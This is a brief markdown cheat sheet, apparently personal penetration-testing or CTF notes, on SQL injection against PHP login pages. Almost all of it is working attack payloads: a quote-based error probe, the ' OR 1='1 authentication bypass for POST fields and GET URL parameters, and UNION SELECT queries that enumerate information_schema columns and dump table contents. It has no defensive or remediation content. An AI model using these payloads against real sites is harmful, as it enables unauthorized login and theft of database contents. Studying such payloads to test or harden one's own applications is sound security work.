## SQL Injection for a .php

### Unsanitized Fields POST SQL Injection Method
	Enter ' into the fields to see if an error appears, if there is an error it is possible to
	use a 
		username=tom' OR 1='1
		passwd=tom' OR 1='1
	in the fields to get into the page

### Login Scripts GET Request Method
	To get a table or some sort of information 
		http://<ip>/<abc>.php?
				- Login		username=tom' OR 1='1 & passwd=tom' OR 1='1
				- Table		UNION SELECT table_name,2,column_name FROM information_schema.columns
				- Specific 	UNION SELECT columnA,columnB,columnC FROM table